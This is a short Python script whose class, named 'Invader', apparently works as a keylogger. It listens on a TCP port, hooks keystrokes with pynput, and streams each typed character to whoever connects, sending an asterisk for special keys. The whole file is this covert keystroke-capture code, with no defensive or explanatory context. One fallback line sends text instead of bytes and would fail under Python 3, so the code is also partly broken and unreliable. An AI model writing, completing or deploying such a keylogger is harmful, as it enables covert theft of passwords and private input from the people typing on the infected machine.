import socket
from pynput import mouse, keyboard
import threading, queue


class Invader:
    def __init__(self):

        self.keysQueue = queue.Queue()
        self.Stop = False
        self.conn = None

        HOST = '...'
        PORT = 65432

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()


            self.conn, addr = s.accept()

            Detect = threading.Thread(target=self.GetKey)
            Detect.start()

    def OnPress(self, key):
        try:
           self.conn.send(key.char.encode())
        except AttributeError:
            self.conn.send('*')

    def GetKey(self):
        with keyboard.Listener(on_press=self.OnPress) as listener:
            listener.join()

if __name__ == "__main__":
    I = Invader()
